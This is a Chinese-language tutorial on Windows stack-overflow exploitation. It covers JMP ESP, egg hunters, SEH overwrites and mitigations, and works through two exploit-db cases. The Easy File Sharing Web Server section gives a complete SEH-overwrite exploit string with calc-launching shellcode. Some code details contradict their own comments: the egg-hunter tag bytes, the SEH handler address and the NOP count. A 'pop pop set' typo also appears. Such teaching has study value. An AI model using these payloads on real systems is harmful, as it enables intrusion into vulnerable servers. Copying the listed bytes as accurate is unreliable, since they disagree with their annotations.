### 从Linux到Windows栈溢出利用
#### JMP ESP
  * 作为一种经典的利用方式，不应该被忘记。
    * 在XP及之前的系统中，很多固定的地址有这样的指令。且并没有DEP保护。
    * 除了系统的，在程序自身的代码中，也可能找到jmp esp。
    * 类推的，jmp reg或许也是一个思路，只要该reg是我们可以控制的。
#### Short jmp
  * 当shellcode的一部分执行，一部分却中断时。可以使用这种方式“滑梯式”地完成利用。
  * 一般这种方式，也可以利用第一种方式填充合适的nop来完成。
#### Egg hnter
  * 当缓冲区空间不够大时，我们可以利用这种技术，写入一段用来搜索shellcode的代码，搜索真正的shellcode执行。
  * 该技术可以在多个平台使用，只是实现的依赖不同 。
    * Linux下，依赖system call来处理搜索过程的“非法访问”
      * 常用的有access(0x21)、和sigaction（0x43），前者每次检查一个地址（4byte），后者可以检查16byte。
    * Windows通常有两种思路
      * 实现一个SEH来处理非法访问
      * 也用system call，一般是NtDisplayString 、IsBadReadPtr
    * 示例基于NtDisplayString技术
        6681CAFF0F     or dx,0x0fff            ;通过添加循环遍历内存中的页面
    42             inc edx                    ;循环遍历每一个地址                
    52             push edx                ;入栈操作                
    6A43         push byte +0x43         ;NtDisplayString的系统调用ID            
    58             pop eax                 ;出栈操作，其实就是作参数
    CD2E         int 0x2e                 ;调用NtDisplayString            
    3C05        cmp al,0x5                 ;对比操作
    5A            pop edx                    ;出栈操作                
    74EF        jz 0x0                     ;如果ZF标志由CMP指令设置，则存在访问冲突
    ;无效页面，回到顶部
    B874303077    mov eax,0x7a757368        ;标签(7a 75 73 68 = zush) 
    8BFA        mov edi,edx                ;将EDI设置为EDX的当前地址指针以用于SCASD指令        
    AF            scasd                     ;将EAX中的值与DWORD值进行比较
    ;在SCASD比较后相应地设置EFLAGS寄存器,这里比较两次才算真正的发现shellcode
    75EA        jnz 0x5 
    AF            scasd                                                 
    75E7        jnz 0x5
    FFE7        jmp edi
    "\x66\x81\xCA\xFF\x0F\x42\x52\x6A\x43\x58\xCD\x2E\x3C\x05\x5A\x74\xEF\xB8"
    egg
    "\x8B\xFA\xAF\x75\xEA\xAF\x75\xE7\xFF\xE7"
    * 注意，这种方式利用，最终执行的shellcode不一定是在栈上，很可能在内存中其他的地方也会有我们输入的copy内容。
    * hunter里面有一个egg，所以作为有效payload的标志就应该是两个egg。
#### SEH HANDLER覆盖
  * 栈溢出经常会导致内存的非法访问（读、写、执行），触发异常。而鉴于[Windows的SEH机制]()，且SEH结构存在栈上。
  * 溢出利用。我们可以覆盖SEH链，每个SEH结构有两个指针，第一个指向下一个SEH结构，第二个指向当前SEH的处理函数。组合利用如下
    * 将指向下一个SEH的指针覆盖为shellcode地址。将指向当前SEH处理函数的指针指向"pop pop ret"操作。
    * 触发SEH。
    * 执行"pop pop ret"，将下一条记录的值作为EIP。跳转到shellcode。
    * 覆盖布置
                junk + nseh + seh + nops + shellcode
                            #nseh is the shellcode_addr or jmp to shellcode or egg hunter
                            #seh is "pop pop ret"'s addr
#### 安全措施
  * 除了类似于Linux下的DEP、ALSR、NX、RELOC之外。
  * ##### XOR
    * 在进入SEH前，将所有寄存器xor操作清零，防止利用。
  * ##### SAFESEH
    * 如果异常处理链不在当前程序的栈中，则终止异常处理调用。
    * 如果异常处理函数的指针指向当前程序的栈中，则终止异常处理调用。
    * 在前两项检查都通过后，调用 RtlIsValidHandler() 进行异常处理有效性检查。
  * ##### SEHOP
    * 系统级别地验证SEH链表的完整性（不需要应用程序开启什么）。
    * SEHOP的全称是Structured Exception Handler Overwrite Protection（结构化  
异常处理覆盖保护）,SEHOP的核心是检测程序栈中的所有SEH结构链表，特  
别是最后一个SEH结构，它拥有一个特殊的异常处理函数指针，指向的是一  
个位于NTDLL中的函数。异常处理时，由系统接管分发异常处理，因此上面  
描述的检测方案完全可以由系统独立来完成，正因为SEH的这种与应用程序  
的无关性，因此应用程序不用做任何改变，你只需要确认你的系统开启了  
SEHOP即可。
#### 实践
  * ##### HALLIBURTON LOGVIEW PRO 9.7.5 、10.0.1拒绝服务漏洞
  * [软件下载](https://www.exploit-db.com/apps/dbce915ea07d5f6367e0e9d93b3ddbac-Halliburton_Log_Viewer.exe)
  * [关于漏洞](https://www.exploit-db.com/exploits/40192)
  * 分析过程
    * 长度足够的POC。
                file = "payload.cgm"
        buffer = "a"*0x1000
        file = open(file, "w")
        file.write(buffer)
        file.close()
    * 在debuger里看到crash的状态
      * 调用栈状态
      * 可以看到我们已经覆盖了SEH
    * 在IDA里溯源，根据调用栈的地址找到最近的调用（在AXCGMV.ocx控件链接库里）。
                .text:1018A66D                                         ; sub_1018A310+393j ...
        .text:1018A66D                 mov     ecx, [esp+0C8h+var_4]
        .text:1018A674                 pop     edi
        .text:1018A675                 pop     esi
        .text:1018A676                 pop     ebp
        .text:1018A677                 pop     ebx
        .text:1018A678                 xor     ecx, esp
        .text:1018A67A                 call    @__security_check_cookie@4 ; __security_check_cookie(x)
        .text:1018A67F                 add     esp, 0B8h
        .text:1018A685                 retn
      * 可以看到，其实是由于我们覆盖了SEH，而进行了security检查（Safeseh的流程），失败后终止了程序。
    * 这里的SafeSeh暂时不会饶过，记下了。。。
  * ##### Easy File Sharing Web Server栈溢出覆盖SEH
    * [软件下载及漏洞详情](https://www.exploit-db.com/exploits/42261/)
    * 漏洞分析
      * 触发
                        buffer = 3000 * "a"
      * SEH已经被覆盖
      * 偏移量确定后，搜索有用的指令"pop pop set"，重新编辑payload
        * 注意格式是pad + nseh + seh + shellcode
                        pad = "/.:/"        # 不常见，但必须
            pad += "a"*53   # 测试字符串
            nseh = "\xeb\x14\x90\x90"   #jmp 0x14 nop nop
            seh = "\x58\x88\x01\x10"  #0x100194bf pop pop ret
            nops = "\x90"*20          # nop * 2018
            shellcode = "\x31\xC9"                    # xor ecx,ecx
            shellcode += "\x51"                        # push ecx
            shellcode += "\x68\x63\x61\x6C\x63"        # push 0x636c6163
            shellcode += "\x54"                        # push dword ptr esp
            shellcode += "\xB8\xAD\x23\x86\x7C"        # mov eax,0x7c8623AD
            shellcode += "\xFF\xD0"                    # call eax
            exploit = pad + nseh + seh + nops + shellcode
            exploit = exploit.ljust(3000, 'a')
  * ##### Unicode程序漏洞利用
    * shellcode不能有截断字符'\x00'，但是unicode绝大部分都是在前加'\x00'
    * 实例Triologic Media Player 8